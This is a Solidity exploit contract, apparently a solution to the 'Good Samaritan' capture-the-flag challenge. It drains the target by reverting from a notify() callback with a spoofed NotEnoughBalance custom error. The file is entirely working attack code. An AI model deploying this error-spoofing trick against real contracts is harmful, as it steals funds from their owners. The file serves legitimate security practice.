```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract GoodSamaritanSolution is INotifyable {
    error NotEnoughBalance();

    function drain(address goodSamaritan) external {
        IGoodSamaritan(goodSamaritan).requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
```
